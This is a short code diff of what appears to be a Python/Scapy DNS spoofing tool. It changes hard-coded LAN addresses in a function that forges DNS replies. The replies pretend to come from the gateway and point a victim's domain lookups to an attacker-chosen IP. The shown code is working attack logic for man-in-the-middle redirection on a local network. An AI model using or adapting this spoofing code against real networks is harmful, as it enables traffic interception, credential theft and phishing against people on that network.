@@ -37,10 +37,10 @@ def dns(data,port):
     global ider
     global ntarget
     global ngateway
-    packet = IP(id=ider + 1,src=ngateway,dst="192.168.178.87") 
+    packet = IP(id=ider + 1,src=ngateway,dst="192.168.178.86") 
     packet = packet / UDP(sport=53, dport=port)
     question = DNSQR(qname=domain,qtype=qtype,qclass=qclass)
-    awnser = DNSRR(rrname=domain,type=1,rclass=1,ttl=10,rdlen=4,rdata="192.168.178.21")
+    awnser = DNSRR(rrname=domain,type=1,rclass=1,ttl=10,rdlen=4,rdata="192.168.178.32")
     packet = packet / DNS(id=id,qr=1,aa=1,ad=1,qdcount=1,ancount=1,qd=question,an=awnser)
     send(packet)
     print("send for "+domain)
@@ -73,7 +73,7 @@ def ethernet(data):
         return
     ip(data[14:])
 
-ntarget = "192.168.178.21"
+ntarget = "192.168.178.32"
 ngateway = "192.168.178.1"
 target = inet_addr(ntarget)
 gateway = inet_addr(ngateway)
